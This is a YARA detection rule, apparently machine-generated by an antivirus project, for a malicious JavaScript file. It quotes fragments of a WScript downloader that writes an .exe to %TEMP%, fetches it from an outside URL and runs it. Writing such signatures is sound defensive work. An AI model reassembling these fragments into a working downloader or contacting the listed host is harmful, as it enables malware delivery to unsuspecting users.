rule sig_20160328_70e2cd01028ae7b0f39504353f146350 {
  meta:
    description = "datamaliciousorder - file 20160328_70e2cd01028ae7b0f39504353f146350.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "26c4890bcd6af2dce4cb808fa55cb7e6eabe4ea298f6fbbbad7629af1e600013"

  strings:
    $s1  = "function Ybdkachuu() {return Xtosfjwy[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"9vdob2SNaI5.exe\";};" fullword ascii
    $s2  = "Oidpgs[Oeydohu](\"GET\", \"http://www.suansawanresort.com/n7eua\", false);" fullword ascii
    $s3  = "do {WScript[Rcxxviqja](Cyqjnrej() * 11)} while (Oidpgs[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Xtosfjwy = function Uiecg() {return WScript[Snuham](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Rriqzir(Ekklwspf, Wkmufcim){return Ekklwspf - Wkmufcim;};" fullword ascii
    $s6  = "function Qtzqi(Pywxwmjd){Xtosfjwy[\"Run\"](Pywxwmjd, Njiaewsg, Njiaewsg);};" fullword ascii
    $s7  = "function Ezwtdipb() {return ((Sotgkbj == true) && (Sotgkbj == Frhqhs)) ? 1 : Njiaewsg;};" fullword ascii
    $s8  = "function Cuexjdut(Stzot) {var Xqgqdlfnem = (1, 2, 3, 4, 5, Stzot); return Xqgqdlfnem;};" fullword ascii
    $s9  = "function Cfqpnhtz(){return Snuham;};" fullword ascii
    $s10 = "var Lyzvpnp = false;" fullword ascii
    $s11 = "function Uvzwvtp(){return Yyinka;};" fullword ascii
    $s12 = "function Nilkbs()" fullword ascii
    $s13 = "var Qyxmjo = new this[\"Date\"]();" fullword ascii
    $s14 = "function Cyqjnrej(){return 22;};" fullword ascii
    $s15 = "Frhqhs = true; " fullword ascii
    $s16 = "Sotgkbj = true; " fullword ascii
    $s17 = "var Sotgkbj = false;" fullword ascii
    $s18 = "var Frhqhs = false;" fullword ascii
    $s19 = " while (Qedypjkye){" fullword ascii
    $s20 = "return Rriqzir(Bfmqcdmpoi, Hmltevwifk);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}